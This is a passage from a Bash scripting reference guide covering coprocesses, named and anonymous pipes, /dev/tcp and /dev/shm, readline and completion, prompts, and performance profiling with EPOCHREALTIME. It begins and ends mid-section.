# now safe to spawn other long-lived processes — no leaked fds
exec /usr/bin/some-daemon
```

The `{NAME[1]}>&-` form is required: a literal numeric `exec 12>&-` would close the wrong fd if Bash assigned a different number. Always close by name.

### Pre-4.4 caveat

On Bash 4.0-4.3, attempting a second `coproc` while the first is alive prints `bash: only one coprocess at a time`. Detect with `((BASH_VERSINFO[0] > 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] >= 4)))` (BCS0409) before relying on the multi-coproc pattern.

### Anti-pattern

```bash
# wrong — same name reused; second coproc clobbers the first's array
coproc CHILD { read -r line; printf '%s\n' "$line"; }
coproc CHILD { read -r line; printf '%s\n' "$line"; }   # second launch
                                                        # silently replaces $CHILD
                                                        # — first child unreachable

# right — distinct names per coproc instance
coproc PARSER  { while read -r line; do printf 'parsed:%s\n' "$line"; done; }
coproc EMITTER { while read -r line; do printf 'emitted:%s\n' "$line"; done; }
```

**See also**: §17.1 (the `coproc` builtin), §17.2 (bidirectional fd pairs and stdbuf), §1.2 (file descriptor model), §11.3 (`wait`), BCS0409 (Bash version detection), BCS1101 (background job management).

## 17.4 Named pipes (FIFOs)

`mkfifo` creates a persistent file-system entity that two unrelated
processes use for one-way communication. Unlike anonymous pipes
(§17.5), a FIFO outlives any individual process and can be opened by
any process with filesystem permission.

### Form register

- `mkfifo PATH` — create the FIFO file with default mode (umask
  applies).
- `mkfifo -m 0600 PATH` — create with explicit mode.
- `cmd1 > FIFO &` — writer; *blocks* until a reader opens the FIFO.
- `cmd2 < FIFO` — reader; blocks until a writer opens the FIFO.
- Bidirectional comms: open two FIFOs, one per direction.
- Cleanup: `rm FIFO` after use — the file persists otherwise.

### `mktemp -p` idiom with trap cleanup

A FIFO created without a cleanup trap leaks across script crashes.
The canonical safe pattern:

```bash
# scenario: ephemeral FIFO with guaranteed cleanup
declare -- fifo
fifo=$(mktemp -u --tmpdir=/tmp "${SCRIPT_NAME}.fifo.XXXXXX")
mkfifo -m 0600 -- "$fifo"
trap 'rm -f -- "$fifo"' EXIT

# producer in the background
(
  for i in {1..5}; do
    printf 'item-%d\n' "$i"
  done
) > "$fifo" &
producer_pid=$!

# consumer in the foreground
while IFS= read -r line; do
  printf 'received: %s\n' "$line"
done < "$fifo"

wait "$producer_pid"
```

- `mktemp -u` *generates* a unique path without creating the file —
  `mkfifo` then creates it as a FIFO. (`-p` and `--tmpdir` are
  synonyms; `--tmpdir=/tmp` is the more explicit form.)
- `-m 0600` restricts the FIFO to the owner; without this the umask
  may grant group/world access (BCS1006).
- The trap fires on any exit (clean, error, signal trapped), removing
  the file even if the script aborts mid-write.

### Round-trip cross-script comms

Two FIFOs let unrelated processes hold a request/reply conversation:

```bash
# scenario: server side
mkfifo /tmp/req /tmp/rep
trap 'rm -f /tmp/req /tmp/rep' EXIT
while IFS= read -r request < /tmp/req; do
  printf 'echo: %s\n' "$request" > /tmp/rep
done

# scenario: client side (separate shell, same host)
printf 'hello\n' > /tmp/req
read -r reply < /tmp/rep
printf '%s\n' "$reply"     # ⇒ echo: hello
```

Each open/close cycle is a synchronisation point — the server's
`read` does not return until the client `printf` opens the FIFO for
writing, and vice versa.

### Pitfalls

- A FIFO with no reader blocks the writer forever (or until the
  reader appears). Use `O_NONBLOCK` from a real program if non-block
  semantics matter; bash has no portable equivalent.
- Multiple readers on one FIFO: each line is delivered to *exactly
  one* reader; ordering across readers is undefined (§16.12).
- Filesystem-bound: a FIFO on `/tmp` is host-local. For cross-host
  IPC, use sockets (§17.6) or a real broker.

### See also

- §17.5 — anonymous pipes (no filesystem entity)
- §17.6 — `/dev/tcp` for cross-host streams
- §16.12 — FIFO-as-queue producer/consumer pattern
- BCS1006 (temporary file handling)

## 17.5 Anonymous pipes

`a | b` creates an anonymous pipe — kernel-allocated, no filesystem
entity, automatically cleaned up when both ends close. The classical
shell IPC primitive and the foundation of every shell pipeline.

### Properties

- Parent and child only; cannot be opened by unrelated processes.
- Auto-cleanup on close (no `rm` needed, unlike a FIFO).
- Half-closed: writer continues until close; reader sees EOF.
- `SIGPIPE` on write to a closed reader (default action: terminate).
- Each pipeline stage runs in its own subshell — variable
  assignments do not propagate to the parent (the canonical "while
  read" trap; see §6.13).

### `pipefail` interaction

Without `pipefail`, a pipeline's exit status is the status of its
*last* command — a failing producer is silently masked by a
successful consumer:

```bash
# without pipefail (or under set +o pipefail)
false | cat            # exit status: 0  ← cat's status
echo $?                # 0

# with pipefail (assumed under strict mode)
set -o pipefail
false | cat            # exit status: 1  ← false's status, propagated
echo $?                # 1
```

Strict mode (BCS0101) sets `pipefail` precisely because silent
failures in the middle of a pipeline are a major class of shell
bugs. Pipelines under strict mode return the rightmost non-zero exit
status, or 0 if every stage succeeded.

### `SIGPIPE` semantics

A producer that writes to a pipe whose reader has closed receives
`SIGPIPE`:

```bash
# scenario: head closes the pipe early; the producer sees SIGPIPE
yes | head -n 5
# yes is killed by SIGPIPE — exits with status 141 (128 + 13)
```

Under `pipefail`, the script sees a non-zero exit because `yes`'s
status (141) is non-zero. For `yes | head` this is harmless; for a
custom producer it may need defensive handling:

```bash
# scenario: producer that ignores SIGPIPE so a closing reader doesn't kill it
( trap '' PIPE; produce_lots ) | head -n 100
```

`trap '' PIPE` ignores `SIGPIPE` for the producer subshell; the
producer's `write(2)` returns `EPIPE` instead, the script can check
`$?` and exit cleanly.

### Subshell semantics

Every pipeline stage runs in its own subshell, with the well-known
consequence that variable assignments in the rightmost stage are
*not* visible to the parent:

```bash
count=0
seq 1 10 | while IFS= read -r line; do count=$((count + 1)); done
printf '%d\n' "$count"     # ⇒ 0  (the while ran in a subshell)

# fix: process substitution (BCS0903), no subshell for the consumer
count=0
while IFS= read -r line; do count=$((count + 1)); done < <(seq 1 10)
printf '%d\n' "$count"     # ⇒ 10
```

See §6.13 for the full pipeline-subshell discussion and the
`lastpipe` shopt that changes this behaviour for the rightmost stage.

### See also

- §6.13 — pipeline subshell semantics in detail
- §17.4 — named pipes (FIFOs) for unrelated processes
- §13 — exit status and `pipefail`
- BCS0101 (strict mode), BCS0903 (process substitution), BCS0905
  (input redirection)

## 17.6 `/dev/tcp` and `/dev/udp`

Bash-synthesised network endpoints. These look like device files but
are intercepted by bash's redirection layer (compiled in with
`--enable-net-redirections`, on by default in mainstream
distributions).

### Form register

- `exec 3<>/dev/tcp/HOST/PORT` — open a bidirectional TCP socket on
  fd 3.
- `exec 3<>/dev/udp/HOST/PORT` — UDP equivalent.
- `cat <&3` — read incoming bytes.
- `printf '...' >&3` — send.
- `exec 3<&-` / `exec 3>&-` — close.

Limitations: no TLS (use `openssl s_client` or a real client), no
SOCKS, no IPv6 syntax in pre-5.0 bash, no name resolution beyond
what `gethostbyname(3)` does. Useful for ad-hoc diagnostics, tiny
clients without `curl`, and one-off probes.

### HTTP/1.0 probe — consolidated

```bash
# scenario: GET / over HTTP/1.0, capture the response, time-bounded
probe_http() {
  local -- host=$1 port=${2:-80} response=''

  # open
  exec 3<>"/dev/tcp/$host/$port" || return 18

  # send (HTTP/1.0 closes the connection on response — no Keep-Alive logic)
  printf 'GET / HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n' "$host" >&3

  # read with timeout per line — the server closes the socket at EOF
  while IFS= read -r -t 5 line <&3; do
    response+="$line"$'\n'
  done

  # close
  exec 3<&-
  exec 3>&-

  printf '%s' "$response"
}

probe_http example.com 80
# ⇒ HTTP/1.0 200 OK
#   Content-Type: text/html; charset=UTF-8
#   ...
```

- HTTP/1.0 with `Connection: close` so the server signals end-of-
  response by closing the socket — no `Content-Length` parsing
  needed.
- `read -t 5` per line guards against a server that opens the socket
  but never replies.
- Closing both halves of the fd (`<&-` and `>&-`) is the conservative
  form; bash 5.x cleans up the dual-direction fd on a single close.

### UDP variant

UDP is connectionless: the bash open succeeds even if no server
listens, so the only failure mode is the read-timeout:

```bash
# scenario: send a single datagram and wait briefly for a reply
probe_udp() {
  local -- host=$1 port=$2 reply=''
  exec 3<>"/dev/udp/$host/$port"
  printf 'PING\n' >&3
  read -r -t 2 reply <&3 || true
  exec 3<&-; exec 3>&-
  printf '%s\n' "$reply"
}
```

### Security caveats

- Plaintext only — credentials in any URL or header are visible on
  the wire (BCS1005, BCS1007).
- No certificate validation: `/dev/tcp` cannot do TLS at all. Reach
  for `openssl s_client -connect host:443` or `curl` for HTTPS.
- DNS lookup uses the OS resolver — affected by `/etc/hosts`,
  `/etc/resolv.conf`, NSS modules.

### When to choose `/dev/tcp` over `curl`

Almost never in production. Defensible cases: a minimal container
without `curl`, a debugging one-liner, a health-check that must not
add a `curl` dependency. Otherwise `curl --max-time 5 -fsS` or `wget
-qO-` is simpler, more robust, and TLS-capable.

### See also

- §17.4 — named pipes (host-local IPC)
- §20.x — security caveats for network IPC
- BCS1005 (input sanitization), BCS1007 (environment scrubbing before
  exec)

## 17.7 `/dev/shm` shared memory

`/dev/shm` is a `tmpfs` — a RAM-backed filesystem mounted by default
on most Linux distributions. Files there live entirely in RAM, are
cleared on reboot, and are visible to every process with the right
permission.

### Properties

- Files in `/dev/shm` live in RAM (or swap when memory pressure hits).
- Cleared on reboot.
- Cross-process visible (any user with permission).
- Shares quota with system RAM — large writes can OOM the host.
- Default mode 1777 (sticky, world-writable, like `/tmp`).

### Use cases

- High-throughput temporary files where disk IO would dominate.
- Coordination files (lock files, status files) that must vanish on
  reboot.
- Backing store for in-memory queues (§16.12) when the queue need not
  survive crashes.

```bash
# scenario: share a state file across cooperating processes for the boot
declare -r STATE_FILE=/dev/shm/myapp.state
printf 'pid=%d ts=%(%FT%T%z)T\n' "$$" -1 > "$STATE_FILE"
```

### Detect availability

`/dev/shm` is *not* universal: minimal containers, BSD systems, and
some hardened distributions omit it. Probe before relying on it:

```bash
# scenario: pick /dev/shm if available, /tmp otherwise
declare -- TMPBASE
if [[ -d /dev/shm && -w /dev/shm ]] && mountpoint -q /dev/shm; then
  TMPBASE=/dev/shm
else
  TMPBASE=${TMPDIR:-/tmp}
fi

WORKDIR=$(mktemp -d --tmpdir="$TMPBASE" "${SCRIPT_NAME}.XXXXXX")
trap 'rm -rf -- "$WORKDIR"' EXIT
```

`mountpoint -q DIR` returns 0 if `DIR` is the mount point of a
filesystem (i.e., not just an empty directory). It is the canonical
"is this real shared memory or just an empty path?" test.

### Detect tmpfs size

The mount option `size=` caps total RAM the tmpfs may use. To inspect:

```bash
# scenario: discover the size cap before writing GB of data
declare -- size_opt
size_opt=$(awk '$2=="/dev/shm" {print $4}' /proc/mounts)
printf 'tmpfs options on /dev/shm: %s\n' "$size_opt"
# ⇒ tmpfs options on /dev/shm:
# (the comma-separated list typically contains rw,nosuid,nodev,inode64
#  and may end in size=NNNNk on systems that pin the cap)

# numerical: bytes free right now
df -B1 --output=avail /dev/shm | tail -n1
# → an integer byte count (varies per system load)
```

`df` reports the *current* free space; the mount option reports the
configured cap. A producer should check `df` before writing because
other tenants may have consumed the share.

### `noexec` interaction

Many distributions mount `/dev/shm` with `noexec` (cannot execute
files placed there) and `nosuid` (no SUID effect). Do not write a
helper script to `/dev/shm` and try to run it — it will fail with
`Permission denied` even though the file is readable and the bits
are right (BCS1001):

```bash
# wrong on hardened systems — /dev/shm has noexec
cat > /dev/shm/helper <<'EOF'
#!/bin/bash
echo hi
EOF
chmod +x /dev/shm/helper
/dev/shm/helper          # ⇒ bash: ./helper: Permission denied (noexec)

# right — sourcing works because no exec(2) is involved
source /dev/shm/helper
```

### Cleanup discipline

Files in `/dev/shm` persist until explicitly removed (or the host
reboots). A script that creates state there should clean up via
trap (BCS0110):

```bash
declare -- shmfile=/dev/shm/myapp.$$
trap 'rm -f -- "$shmfile"' EXIT
```

### See also

- §16.10 — locking primitives that frequently land in `/dev/shm`
- §17.4 — named pipes (often created in `/dev/shm` for performance)
- BCS1006 (temporary file handling), BCS1001 (SUID/SGID prohibition)

## 17.8 External IPC tools

When bash's primitives aren't enough.

- `socat` — multi-protocol relay; can bridge anything to anything.
- `ncat` (nmap), `nc` (BSD or GNU) — TCP/UDP utility.
- `redis-cli` — message broker.
- D-Bus via `gdbus`/`busctl` — desktop IPC.
- These extend bash's reach without replacing it.

## 17.9 Choosing the right primitive

Decision tree.

- **One-off pipe between two commands you control:** `|` (anonymous pipe).
- **Bidirectional with a persistent helper:** `coproc`.
- **Cross-script communication:** FIFO.
- **Network:** `/dev/tcp` for trivial cases; `socat` or `curl` otherwise.
- **Shared memory between unrelated processes:** `/dev/shm` with file-based protocol.
- **Robust message passing:** external broker (Redis, Kafka, RabbitMQ).
- Match primitive to durability, throughput, and concurrency needs.

# Part XVIII — Readline, History, and Completion

*Bash's interactive layer. This Part is irrelevant for batch scripts but central to writing tools your team will use day-to-day.*

---

---

## 18.1 Readline overview

The GNU Readline library handles line editing in interactive bash.

- Provides command-line editing, history navigation, completion.
- Configured per-user via `~/.inputrc`; system-wide via `/etc/inputrc`.
- Bash binds default keys; `bind` builtin allows runtime customisation.
- Two editing modes: emacs (default) and vi.
- Active only when stdin is a terminal.
- Disabled with `bash --noediting` or `set +o emacs`.

## 18.2 Editing modes

Two key-binding regimes.

- emacs: `set -o emacs` (default).
- vi: `set -o vi`.
- Key bindings differ; same underlying functions.
- vi mode has insert and command modes; emacs mode is single-mode.
- Switch at runtime: `set -o vi`.
- Indicator in prompt via `\$`-conditional or readline variable.

## 18.3 Key bindings

`bind` builtin and `~/.inputrc` configure key bindings.

- `bind '"\C-l": clear-screen'` — bind Ctrl-L.
- `bind -p` — list current bindings.
- `bind -P` — list with descriptions.
- `bind -l` — list available functions (also see §18.4).
- `bind -f FILE` — load bindings from file (typically `~/.inputrc`).
- `~/.inputrc` syntax: `"keysequence": function-name` or `"keysequence": "string"`.
- Keysequences: `\C-x` (Ctrl-X), `\M-x` (Meta/Alt-X), `\e` (escape), literal characters.
- Conditional blocks via `$if mode=emacs` / `$if mode=vi` / `$if Bash` / `$endif`.

```text
# ~/.inputrc — minimal anchor
$include /etc/inputrc

set show-all-if-ambiguous on
set completion-ignore-case on

$if mode=emacs
  "\C-l": clear-screen
  "\e[A": history-search-backward
  "\e[B": history-search-forward
$endif
```

The `$include` line picks up the system default; the `set` directives toggle
readline variables (see `bind -V` for the full list); the `$if` block scopes
emacs-mode-only key bindings.

**See also**: §18.2 (editing modes), §18.4 (bindable functions), §18.5 (history).

## 18.4 Bindable functions

Readline's full function catalogue.

- Movement: `forward-char`, `backward-char`, `forward-word`, `backward-word`, `beginning-of-line`, `end-of-line`.
- Editing: `delete-char`, `backward-delete-char`, `kill-word`, `backward-kill-word`, `kill-line`, `unix-line-discard`.
- History: `previous-history`, `next-history`, `reverse-search-history`, `forward-search-history`.
- Completion: `complete`, `possible-completions`, `menu-complete`.
- Macros: `start-kbd-macro`, `end-kbd-macro`, `call-last-kbd-macro`.
- See `bind -l` for the full list.

## 18.5 History

Bash maintains a history of commands.

- `HISTFILE` — file path (default `~/.bash_history`).
- `HISTSIZE` — number of commands in memory.
- `HISTFILESIZE` — number of lines in the file.
- `HISTCONTROL` — list: `ignoreboth`, `ignoredups`, `ignorespace`, `erasedups`.
- `HISTIGNORE` — colon-separated patterns to skip.
- `HISTTIMEFORMAT` — printf format for timestamps in `history` output.
- `HISTAPPEND` shopt — append on exit instead of overwrite.
- `cmdhist` shopt — store multi-line commands as one entry.
- Per-session vs persistent: in-memory list flushed to file on exit (or `history -a`).

## 18.6 The `history` builtin

Manipulate the history list.

- `history` — list all.
- `history N` — last N entries.
- `history -d N` — delete entry N.
- `history -d START-END` — delete range (Bash 5.0+).
- `history -c` — clear in-memory list.
- `history -a` — append in-memory to file.
- `history -w` — overwrite file with in-memory.
- `history -r` — read file into memory.
- `history -p ARG` — perform history expansion on ARG, print result.
- `history -s ARG` — add ARG to history without executing.

## 18.7 History expansion

`!` introduces history references on the command line.

- `!!` — last command.
- `!N` — command N (positive) or N back (negative).
- `!STRING` — most recent command starting with STRING.
- `!?STRING?` — most recent command containing STRING.
- `^old^new` — substitute old with new in last command.
- `!$` — last argument of last command.
- `!^` — first argument of last command.
- `!*` — all arguments of last command.
- `!:N` — N-th argument of last command.
- `!:s/old/new/` — substitution.
- Disable in scripts: `set +H` or non-interactive default.
- Pitfall: `"!"` in double quotes triggers expansion in interactive shells.

## 18.8 Programmable completion

Bash can complete arbitrary commands using user-defined functions.

- `complete -F funcname cmd` — call funcname when completing for cmd.
- The function inspects `COMP_WORDS`, `COMP_CWORD`, etc., and populates `COMPREPLY` (see §18.12).
- `complete -p` — list current completions.
- `complete -o option …` — completion options (default, bashdefault, dirnames, filenames, …).
- Stored in `/usr/share/bash-completion/completions/CMD` typically.
- `bash-completion` package provides defaults for many tools.

```bash
# scenario: complete `mytool start|stop|status`
_mytool() {
  local cur
  cur="${COMP_WORDS[COMP_CWORD]}"
  COMPREPLY=()
  if ((COMP_CWORD == 1)); then
    mapfile -t COMPREPLY < <(compgen -W 'start stop status' -- "$cur")
  fi
}
complete -F _mytool mytool
```

`compgen -W` filters the wordlist by the current prefix; `mapfile` populates
the array without word-splitting surprises. Drop the file under
`~/.local/share/bash-completion/completions/mytool` for autoload.

**See also**: §18.9 (compspec actions), §18.10 (`_init_completion`), §18.11 (dynamic completion).

## 18.9 Compspec actions

Built-in completion sources.

- `complete -A action cmd` — use built-in action.
- Actions: `alias`, `arrayvar`, `binding`, `builtin`, `command`, `directory`, `disabled`, `enabled`, `export`, `file`, `function`, `group`, `helptopic`, `hostname`, `job`, `keyword`, `running`, `service`, `setopt`, `shopt`, `signal`, `stopped`, `user`, `variable`.
- `complete -W "list" cmd` — completion from a fixed word list.
- `complete -G 'pattern' cmd` — completion from a glob.

## 18.10 `_init_completion`

Helper from `bash-completion` for the standard completion boilerplate.

- Called at the start of a `_funcname` completion function.
- Sets `cur`, `prev`, `words`, `cword` variables.
- Returns 0 to continue, non-zero to short-circuit (e.g., for `--help`).
- `-n CHAR` — characters to treat as word breaks (e.g., `-n =:`).
- See `/usr/share/bash-completion/bash_completion` for source.

```bash
# scenario: skeleton using the helper
_mytool() {
  local cur prev words cword
  _init_completion -n =: || return
  case "$prev" in
    --config) _filedir conf ;;
    *)        mapfile -t COMPREPLY < <(compgen -W '--help --config' -- "$cur") ;;
  esac
}
complete -F _mytool mytool
```

`_init_completion` populates the four locals declared above; the `-n =:`
treats `=` and `:` as word-break characters so `--config=foo` splits cleanly.
Companion helpers from the same library: `_filedir`, `_known_hosts_real`,
`_pids`, `_pgids`.

**See also**: §18.8 (programmable completion), §18.11 (dynamic completion functions), §18.12 (`COMPREPLY`).

## 18.11 Dynamic completion functions

Patterns for writing completion functions.

```bash
_my_tool() {
  local cur prev words cword
  _init_completion || return
  case $prev in
    --file) _filedir; return ;;
    --user) COMPREPLY=($(compgen -u -- "$cur")); return ;;
  esac
  case $cur in
    --*) COMPREPLY=($(compgen -W '--help --version --file --user' -- "$cur")) ;;
  esac
}
complete -F _my_tool my_tool
```

- `compgen -W "list" -- "$cur"` — filter list by current prefix.
- `_filedir` — directories and files (from bash-completion).
- `_filedir 'sh'` — files matching extension.
- `_known_hosts_real` — hosts from various sources.
- Cache expensive operations.

## 18.12 `COMPREPLY` and `COMP_*` variables

The completion environment.

- `COMPREPLY` — array; each element is a candidate completion.
- `COMP_WORDS` — array of words on the current command line.
- `COMP_CWORD` — index into COMP_WORDS of the current word being completed.
- `COMP_LINE` — full current command line.
- `COMP_POINT` — cursor position within COMP_LINE.
- `COMP_TYPE` — completion-type indicator (TAB, ?, !, @, %).
- `COMP_KEY` — key that triggered completion.
- `COMP_WORDBREAKS` — characters that break words for completion (default `' \t\n"\''><=;|&(:'`).

## 18.13 Prompts

Bash uses several prompt variables for different contexts.

- `PS0` — printed after reading a command, before executing (Bash 4.4+).
- `PS1` — primary prompt (interactive).
- `PS2` — continuation prompt (multi-line input).
- `PS3` — `select` menu prompt.
- `PS4` — `set -x` trace prefix.
- Default `PS1`: `\u@\h:\w\$`.
- Default `PS4`: `+ `.

## 18.14 Prompt escapes

Special sequences expanded in prompts.

- `\u` — username.
- `\h` — hostname (short).
- `\H` — hostname (FQDN).
- `\w` — current working directory.
- `\W` — basename of CWD.
- `\$` — `#` if root, `$` otherwise.
- `\!` — history number.
- `\#` — command number.
- `\d` — date.
- `\t`, `\T`, `\@`, `\A` — time formats.
- `\e` — escape (for ANSI colours).
- `\[…\]` — non-printing sequence (essential for colour to avoid line-wrap miscalculation).
- `\j` — number of jobs.
- `\l` — basename of terminal device.

## 18.15 Coloured and multi-line prompts

Practical prompt customisation.

- Wrap colour escapes in `\[…\]` for accurate cursor positioning.
- Multi-line: include `\n` in `PS1`; bash handles the wrapping.
- Conditional content: `${VAR:+prefix$VAR}` for git-branch-style additions.
- `PROMPT_COMMAND` — runs before each prompt; useful for state inspection.
- Powerline-style prompts: `starship`, `oh-my-bash`, hand-rolled.

```bash
# scenario: two-line prompt, green user@host, branch suffix
PS1='\[\e[32m\]\u@\h\[\e[0m\]:\w${BRANCH:+ \[\e[33m\](${BRANCH})\[\e[0m\]}\n\$ '
```

The `\[ … \]` markers tell readline that the bytes inside emit no visible
columns; without them, line wrap and cursor recall break after the first
right-edge overflow. Bare `\e[…m` outside `\[…\]` is the most frequent
prompt bug. `${BRANCH:+…}` only emits the parenthesised group when `BRANCH`
is non-empty — populate it from `PROMPT_COMMAND` (e.g., `git symbolic-ref`).

**See also**: §18.13 (prompts), §18.14 (prompt escapes), §18.16 (capability detection).

## 18.16 Terminal capability detection

Determining what the terminal supports.

- `tput colors` — number of colours.
- `tput cols`, `tput lines` — dimensions.
- `tput setaf N`, `tput setab N` — set foreground/background colour.
- `tput bold`, `tput sgr0` — bold, reset.
- `infocmp` — full terminfo entry.
- `$TERM` — terminal type (xterm, screen, tmux, dumb).
- `$COLORTERM` — modern: `truecolor` or `24bit` for 24-bit colour support.
- Always test before emitting colour: avoid breaking dumb terminals or pipes (BCS0708).

```bash
# scenario: colour only when stdout is a TTY with ≥8 colours
if [[ -t 1 && "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]]; then
  declare -r RED=$'\033[31m' GREEN=$'\033[32m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' NC=''
fi
printf '%sok%s\n' "$GREEN" "$NC"
```

The `[[ -t 1 ]]` guard rejects pipes and redirections; the `tput colors`
check rejects `TERM=dumb`; the `2>/dev/null || echo 0` defends against
missing terminfo entries. This is the canonical BCS0706/BCS0708 pattern —
all messaging in this reference assumes the same gate.

**See also**: §18.13 (prompts), §18.15 (coloured prompts), §14 (messaging).

# Part XIX — Performance

*Bash is often blamed for being slow. Most "slow Bash" scripts are slow because they fork external commands in tight loops. This Part documents the cost model, the profiling tools, and the optimisations.*

---

---

## 19.1 The Bash cost model

Rough relative costs for common operations.

- Builtin (e.g., `[[`, `printf`, parameter expansion): nanoseconds. Effectively free.
- Variable assignment, arithmetic, string operations: nanoseconds.
- Subshell `$(…)`, `(…)`, pipeline element: ~1 millisecond.
- Fork+exec of an external command: ~1 millisecond (depends on binary size and OS caching).
- Disk I/O: variable (microseconds to milliseconds).
- Network I/O: variable (milliseconds).
- A single fork is cheap; 10,000 forks in a loop is ~10 seconds.

These figures are order-of-magnitude estimates measured on Linux 6.x with
warm filesystem caches; the absolute numbers vary with hardware, but the
ratios — builtin ≪ subshell ≈ fork — hold consistently. Profile your own
hot path before optimising (§19.2).

```bash
# scenario: back-of-envelope demo — 10,000 builtin vs subshell calls
n=10000

start=$EPOCHREALTIME
for ((i = 0; i < n; i+=1)); do : ; done                     # builtin only
end=$EPOCHREALTIME
printf 'builtin loop:  %.3f s\n' "$(( ${end/./} - ${start/./} ))e-6"

start=$EPOCHREALTIME
for ((i = 0; i < n; i+=1)); do x=$(echo) ; done             # subshell each iter
end=$EPOCHREALTIME
printf 'subshell loop: %.3f s\n' "$(( ${end/./} - ${start/./} ))e-6"
# ⇒ builtin loop:
# ⇒ subshell loop:
# (absolute numbers vary by hardware; the load-bearing observation is the
#  ratio: the subshell loop is roughly two orders of magnitude slower)
```

The two-orders-of-magnitude gap is why §19.8 (parameter expansion vs
externals) matters in inner loops.

**See also**: §19.2 (profiling), §19.6 (`EPOCHREALTIME`), §19.8 (param vs external).

## 19.2 Profiling tools

Measuring where time goes.

- `time cmd` — wall, user, sys time.
- `time { cmd1; cmd2; …; }` — time a sequence.
- `BASH_XTRACEFD=N` and `set -x` — trace each command (§19.4).
- `EPOCHREALTIME` for fine-grained timing (§19.6).
- `strace -c -f cmd` — syscall counts and times.
- `perf stat cmd` — CPU performance counters; per-shell sampling rarely useful (bash dispatches via switch on opcode).
- For hot loops, sample-based profilers don't work well on bash; instrument manually.

```bash
# scenario: per-section instrumentation with EPOCHREALTIME
profile() {
  local -- label="$1"
  local -- start="$2"
  local -- end="$EPOCHREALTIME"
  printf >&2 'PROFILE %-20s %.6f s\n' "$label" \
    "$(awk -v a="$end" -v b="$start" 'BEGIN { print a - b }')"
}

t0=$EPOCHREALTIME
build_index
profile 'build_index' "$t0"

t0=$EPOCHREALTIME
process_data
profile 'process_data' "$t0"
```

`EPOCHREALTIME` is fork-free; the single `awk` per checkpoint is cheaper
than `bc` (§19.6 shows a fork-free integer-microsecond pattern). For
finer-grained traces, redirect `set -x` output via `BASH_XTRACEFD` (§19.4)
combined with a `PS4` carrying `$EPOCHREALTIME` (§19.5).

**See also**: §19.3 (`time` builtin), §19.4 (`BASH_XTRACEFD`), §19.5 (PS4), §19.6 (`EPOCHREALTIME`).

## 19.3 `time` builtin vs `time` external

Bash has a `time` reserved word and a `/usr/bin/time` external.

- Bash `time`: built into the shell, times pipelines and compound commands.
- External `time`: separate process; can't time builtins or shell constructs.
- `time -p` (POSIX format) and `TIMEFORMAT` variable for bash's `time`.
- `TIMEFORMAT='%R'` for just real seconds.
- `/usr/bin/time -v` for richer info (max RSS, page faults, context switches).

```bash
# scenario: bash builtin with custom format
TIMEFORMAT='real %3R | user %3U | sys %3S | cpu %P%%'
time { sleep 0.5; ls -R /usr >/dev/null; }
# ⇒ real 0.612 | user 0.080 | sys 0.140 | cpu 35.94%
```

```text
$ /usr/bin/time -v ls -R /usr >/dev/null
        Command being timed: "ls -R /usr"
        User time (seconds): 0.06
        System time (seconds): 0.13
        Percent of CPU this job got: 99%
        Elapsed (wall clock) time (h:mm:ss or m:ss): 0:00.20
        Maximum resident set size (kbytes): 4992
        Voluntary context switches: 1
        Involuntary context switches: 4
```

Use the builtin for shell-level work (loops, function bodies); reach for
`/usr/bin/time -v` only when you need RSS or syscall accounting on a
single external command.

**See also**: §19.2 (profiling tools), §19.4 (`BASH_XTRACEFD`), §19.6 (`EPOCHREALTIME`).

## 19.4 `BASH_XTRACEFD`

Redirect `set -x` output to a specific fd.

- `exec 3>>trace.log` then `BASH_XTRACEFD=3` — trace to file, not stderr.
- Keeps trace out of the script's user-facing output.
- Combine with `PS4` for rich context (§19.5).
- Available since Bash 4.1.

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

# scenario: timestamped trace to a file, no noise on stderr
exec 3>>"$HOME/trace.$$.log"
export BASH_XTRACEFD=3
export PS4='+ $EPOCHREALTIME ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:-main} '
set -x

build_index() { :; }
process_data() { :; }

build_index
process_data

# release the fd; trap covers abort paths
cleanup() { exec 3>&-; }
trap cleanup EXIT

```

The `exec 3>>…` opens a writable fd; `BASH_XTRACEFD=3` retargets the trace
stream so `>&2` user diagnostics stay clean. The `cleanup` trap (BCS0603,
BCS0110) closes the fd on every exit path.

**See also**: §19.5 (PS4 instrumentation), §19.2 (profiling), BCS0110 (cleanup), BCS0603 (traps).

## 19.5 `PS4` instrumentation

Customise `set -x` trace prefix.

- `PS4='+ ${BASH_SOURCE}:${LINENO}:${FUNCNAME[0]:-main}: '` — file, line, function.
- `PS4='+[$EPOCHREALTIME] '` — timestamp each traced command.
- `PS4='+ ${BASH_SUBSHELL}: '` — subshell depth.
- Combinations: `'+[$EPOCHREALTIME ${BASH_SOURCE##*/}:${LINENO}] '`.
- Pitfall: `PS4` itself is expanded; `\033[…m` colour codes work but the leading `+ ` is added by bash.

## 19.6 `EPOCHREALTIME` for sub-second timing

Bash 5.0+ exposes the system clock with microsecond precision.

- `EPOCHREALTIME` — string like `1716234567.123456`.
- `EPOCHSECONDS` — integer seconds.
- Older bash: use `date +%s.%N` (forks!) or compile a custom loadable.

```bash
# scenario: fork-free microsecond delta
start="$EPOCHREALTIME"
do_thing
end="$EPOCHREALTIME"

# strip the dot, treat the timestamp as integer microseconds
delta=$(( ${end/./} - ${start/./} ))

printf '%d.%06d s\n' $((delta / 1000000)) $((delta % 1000000))
# ⇒ 0.001234 s
```

`${end/./}` deletes the decimal point so the value becomes a 16-digit
integer suitable for `(( ))` arithmetic — no `bc` fork (which would itself
cost ~1 ms and defeat the timing). The two-`printf` formula reconstructs
seconds-and-microseconds from the integer microsecond delta.

```bash
# wrong — forks bc each iteration; the fork itself dominates the delta
delta=$(echo "$end - $start" | bc -l)
```

**See also**: §19.1 (cost model), §19.2 (profiling), §19.5 (PS4 with `$EPOCHREALTIME`).

## 19.7 Common optimisations

Patterns that reliably speed up scripts.

- Replace external commands with builtins (§19.10).
- Replace pipes with redirection where possible (§19.9).
- Avoid `$(…)` in tight loops.
- Use parameter expansion instead of `sed`/`awk` for simple substitutions (§19.8).
- Batch external calls: one `awk` over many lines vs many `awk`s over one line each.
- Use arrays instead of repeated string parsing.
- Use `mapfile` instead of `while read` loops.

## 19.8 Parameter expansion vs external commands

Replace `sed`/`awk`/`cut` with bash builtins where possible.

| Task | External | Parameter expansion |
|------|----------|---------------------|
| Strip `.txt` suffix | `$(echo "$f" | sed 's/.txt$//')` | `${f%.txt}` |
